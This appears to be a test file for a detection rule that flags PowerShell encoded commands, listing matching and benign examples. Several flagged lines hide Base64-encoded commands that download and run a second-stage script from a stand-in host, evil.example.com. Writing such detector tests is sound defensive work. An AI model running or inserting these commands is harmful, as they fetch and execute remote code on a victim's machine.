# ruleid: ps-encoded-command-flag
powershell.exe -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGUAeABhAG0AcABsAGUALgBjAG8AbQAvAHMAdABhAGcAZQAyAC4AcABzADEAJwApAA==

# ruleid: ps-encoded-command-flag
Start-Process powershell -ArgumentList "-enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACAA"

# ruleid: ps-encoded-command-flag
& powershell -e JABjAD0AJwBodHRwOi8vZXZpbC5leGFtcGxlLmNvbS9zdGFnZTIucHMxJwA=

# ok: ps-encoded-command-flag
$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($script))
Write-Host "Encoded: $encoded"

# ok: ps-encoded-command-flag
$bytes = [Convert]::FromBase64String($base64Data)
[IO.File]::WriteAllBytes($outputPath, $bytes)
